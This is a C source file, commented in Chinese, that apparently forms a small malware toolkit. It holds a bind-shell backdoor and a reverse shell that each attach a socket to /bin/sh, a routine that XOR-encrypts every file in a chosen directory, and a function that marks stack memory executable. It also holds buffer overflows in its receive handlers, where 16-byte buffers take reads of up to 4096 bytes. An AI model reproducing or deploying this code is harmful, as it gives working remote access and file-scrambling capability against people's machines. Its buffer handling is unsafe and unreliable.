#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <pthread.h>

#define branch_CodeBegin			do {
#define branch_CodeEnd				} while( 0 );
#define region_begin				{
#define region_end				}

#define trAssert_return( cond, retval )		branch_CodeBegin if( !( cond ) ) return ( retval ); branch_CodeEnd
#define trAssert_nonret( cond )			branch_CodeBegin if( !( cond ) ) return ; branch_CodeEnd
#define trAssert_break( cond )			{ if( !( cond ) ) break; }
#define trAssert_continue( cond )		{ if( !( cond ) ) continue; }
#define trAssert( cond )			branch_CodeBegin if( !( cond ) ) return -1; branch_CodeEnd

void error_handling(char *message) { fputs(message, stderr); fputc('\n', stderr); exit(1);}

#define MAX_RECV (16)
#define MAX_LEN (256)
#define MAX_SIZE (4096)

// 反向连接用到的远程ip
char g_ip[MAX_LEN] = {"127.0.0.1"} ;
// 正向连接的端口
int g_dport = 1985 ;
// 反向连接的端口
int g_port = 1986 ;
// 本地监听的端口
int g_listenport = 1234 ;
// 本地要加密的目录
char g_filepath[MAX_LEN] = {"~/"} ;
// 加密的密钥
char g_key = 0x2b ;

const char Welcome[] = "Welcome, Hacker!\r\n" ;

// 开启监听服务
int StartServer(void) ;

// 正向连接后门
int Backdoor(void) ;

// 反向连接后门
int ReverseBackdoor(void) ;

// 加密目录下文件，不遍历子目录
int EncryptDirector(void) ;

// 加密单个文件
int Encrypt(char *path, char enkey) ;

// 为指定内存设置为可读，可写，可执行权限
int PassNX(void) ;

// 开始多线程的情况下处理函数
static void DataHandle(void * sock_fd) ;   //Only can be seen in the file

int main(int argc, char **argv)
{
#ifndef DEBUG
    int opt = 0 ;
    if(argc > 1)
    {
        while(-1 != (opt = getopt(argc, argv,"a:d:p:f:k:l:")))
        {
            switch(opt)
            {
                case 'a': // 反向连接的ip
                    strcpy(g_ip, optarg) ;
                    break ;
                case 'p': // 反向连接的端口
                    g_port = atoi(optarg) ;
                    break ;
                case 'f':   // 待加密路径
                    strcpy(g_filepath, optarg) ;
                    break ;
                case 'k':   // 加密密钥
                    g_key = (char)atoi(optarg) ;
                    break ;
                case 'd':   // 正向连接监听端口
                    g_dport = atoi(optarg) ;
                    break ;
                case 'l':   // 开启本地服务监听端口
                    g_listenport = atoi(optarg) ;
                    break ;
            }
        }

        printf("server: %s : %d\r\n", g_ip, g_port) ;
        printf("filepath: %s\r\n", g_filepath) ;
    }
#else
    strcpy(g_filepath, "/Users/evilknight/document/testEntry") ;
    g_key = 12 ;
#endif
    //ReverseBackdoor() ;
    //EncryptDirector() ;

    StartServer() ;
    
    return 0 ;
}


// 开启监听服务
int StartServer(void)
{
    int serv_sock = 0 ;
    int clnt_sock = 0;

    struct sockaddr_in serv_addr = {0};
    struct sockaddr_in clnt_addr = {0};
    socklen_t clnt_addr_size = 0;
    int nRecv = 0 ;
    char recv_buf[MAX_RECV] = {0} ;
    int nContinue = 1 ;
    

    serv_sock = socket(PF_INET, SOCK_STREAM, 0);
    
    if(serv_sock == -1)
        error_handling("StartServer socket() error");

    serv_addr.sin_family=AF_INET;
    serv_addr.sin_addr.s_addr=htonl(INADDR_ANY);
    serv_addr.sin_port=htons(g_listenport);

    if(bind(serv_sock, (struct sockaddr*) &serv_addr, sizeof(serv_addr))==-1)
        error_handling("StartServer bind() error"); 

    if(listen(serv_sock, 5)==-1)
        error_handling("StartServer listen() error");

    printf("Server Start !\n");

    while(nContinue == 1)
    {
        pthread_t thread_id ;
        clnt_addr_size=sizeof(clnt_addr);  
        clnt_sock=accept(serv_sock, (struct sockaddr*)&clnt_addr,&clnt_addr_size);
        if(clnt_sock==-1)
            error_handling("accept() error");  

        write(clnt_sock, Welcome, sizeof(Welcome));
#ifdef MULIT_THREAD
        if(pthread_create(&thread_id,NULL,(void *)(&DataHandle),(void *)(&clnt_sock)) == -1)
        {
            fprintf(stderr,"pthread_create error!\n");
            break;                                  //break while loop
        }
#else
        while(1)
        {
            nRecv = recv(clnt_sock, recv_buf, MAX_SIZE, 0) ;
            if(nRecv > 0)
                printf("recv: %d byte, content: %s", nRecv, recv_buf) ;
            else
            {
                puts("recv failed!") ;
                close(clnt_sock) ;
                break ;
            }   
        }
#endif
    }

    close(serv_sock);

    shutdown(serv_sock, SHUT_WR) ;
    printf("Server shuts down\n");

    return 0 ;
}


int Backdoor(void)
{
    int sock = 0, clnt_sock = 0;
    int clnt_addr_size = 0 ;
    struct sockaddr_in server = {0} ;
    struct sockaddr_in clnt_addr = {0} ;
    if(0 == g_dport || 65535 < g_dport)
        return -1 ;
    
    if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        printf("Couldn't make socket!n"); 
        return -1 ;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(g_dport);
    server.sin_addr.s_addr = htonl(INADDR_ANY);;

    if(bind(sock, (struct sockaddr*) &server, sizeof(struct sockaddr)) ==- 1)
    {
        printf("Backdoor bind failed !\n") ;
        close(sock) ;
        return -1;
    }

    if(listen(sock, 5)==-1)
    {
        printf("Backdoor listen failed !\n") ;
        close(sock) ;
        return -1;
    }

    while(1)
    {
        clnt_addr_size = sizeof(clnt_addr);  
        clnt_sock = accept(sock, (struct sockaddr*)&clnt_addr,&clnt_addr_size);
        if(clnt_sock != -1)
        {
            send(clnt_sock, Welcome, sizeof(Welcome), 0);
            printf("send %s", Welcome) ;

            dup2(clnt_sock, 0);
            dup2(clnt_sock, 1);
            dup2(clnt_sock, 2);
            execl("/bin/sh", "/bin/sh",(char *)0);
            close(clnt_sock);
        }   
    }

    close(sock) ;
    return 0 ;
}

int ReverseBackdoor(void)
{
    int sock ;
    struct sockaddr_in server = {0} ;
    if(strlen(g_ip) <= 0 || 0 == g_port || 65535 < g_port)
        return -1 ;
    
    if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        printf("Couldn't make socket!\n"); 
        return -1 ;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(g_port);
    server.sin_addr.s_addr = inet_addr(g_ip);

    if(connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1)
    {
        printf("Could not connect to remote shell!n") ;
        close(sock) ;
        return -1;
    }
    send(sock, Welcome, sizeof(Welcome), 0);
    printf("send %s", Welcome) ;
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execl("/bin/sh", "/bin/sh",(char *)0);
    close(sock);
    return 0 ;
}

int EncryptDirector(void)
{
    DIR *d = NULL;
    struct dirent *dp = NULL; /* readdir函数的返回值就存放在这个结构体中 */
    struct stat st;    
    char path[MAX_LEN] = {0};
    char curpath[MAX_LEN] = {0} ;
    if(strlen(g_filepath) <= 0)
        return -1 ;

    strcpy(path, g_filepath) ;
    
    if(stat(path, &st) < 0 || !S_ISDIR(st.st_mode))
    {
        printf("invalid path: %s\n", path);
        return -1 ;
    }

    if(!(d = opendir(path)))
    {
        printf("opendir[%s] error: %m\n", path);
        return -1 ;
    }

    while((dp = readdir(d)) != NULL)
    {
        /* 把当前目录.，上一级目录..及隐藏文件都去掉，避免死循环遍历目录 */
        if((!strncmp(dp->d_name, ".", 1)) || (!strncmp(dp->d_name, "..", 2)))
            continue;

        snprintf(curpath, sizeof(curpath) - 1, "%s/%s", path, dp->d_name);
        stat(curpath, &st);
        if(!S_ISDIR(st.st_mode))
        {
            printf("d_name: %s\n", dp->d_name);
            printf("%s\t key: %d\n", curpath, g_key) ;
            Encrypt(curpath, g_key) ;
        } else
        {
            printf("d_name: %s\n", dp->d_name);
            // 目录就不接着遍历了
        }
    }
    closedir(d);

    return 0 ;
}

int Encrypt(char *path, char enkey)
{
    FILE *infile = NULL , *outfile = NULL;
    int rc = 0 , i = 0;
    char buf[MAX_LEN] = {0} ;
    char outfilepath[MAX_LEN] = {0} ;

    if(NULL == path || strlen(path) <= 0 || NULL == (infile = fopen(path, "rb")))
        return -1 ;

    strcpy(outfilepath, path) ;
    strcat(outfilepath, ".encrypt") ;

    if(NULL == (outfile = fopen(outfilepath, "wb+")))
    {
        fclose(infile) ;
        return -1 ;
    }

    while((rc = fread(buf, sizeof(char), sizeof(buf)/sizeof(buf[0]), infile)) > 0)
    {
        for(i = 0; i < rc; ++i)
            buf[i] ^= enkey ;
        
        fwrite(buf, rc, 1, outfile) ;
    }
    
    fclose(infile) ;
    fclose(outfile) ;
    return 0;
}

// 将当前栈内存设置为可读，可写，可执行权限
int PassNX(void)
{
    int nError = 0 ;
    nError = mprotect((void *)((unsigned long long)&nError &(~0XFFFUL)), 
                    0x1000 - 1, 
                    PROT_READ | PROT_WRITE | PROT_EXEC) ;
    printf("PassNX Result: %d \n", nError) ;
    if(0 != nError)
    {
        perror(strerror(errno)) ;
        printf("&nError:%lp\n align:%lp\n", (unsigned long long)&nError, ((unsigned long long)&nError &(~0XFFFUL))) ;
    }
    return 0 ;
}

void DataHandle(void * sock_fd)
{
    int fd = *((int *)sock_fd);
    int i_recvBytes;
    char data_recv[MAX_RECV];
    const char * data_send = "Server has received your request!\n";

    while(1)
    {
        printf("waiting for request...\n");
        //Reset data.
        memset(data_recv,0,MAX_LEN);

        i_recvBytes = read(fd,data_recv,MAX_SIZE);
        if(i_recvBytes == 0)
        {
            printf("Maybe the client has closed\n");
            break;
        }
        if(i_recvBytes == -1)
        {
            fprintf(stderr,"read error!\n");
            break;
        }
        if(strcmp(data_recv,"quit")== 0 || strcmp(data_recv, "exit"))
        {
            printf("Quit command!\n");
            break;                           //Break the while loop.
        }
        printf("read from client : %s\n",data_recv);
        sprintf(data_recv, "Reply: %s", data_recv) ;
        if(write(fd,data_send,strlen(data_send)) == -1)
        {
            break;
        }
    }

    //Clear
    printf("terminating current client_connection...\n");
    close(fd);            //close a file descriptor.
    pthread_exit(NULL);   //terminate calling thread!
    return ;
}
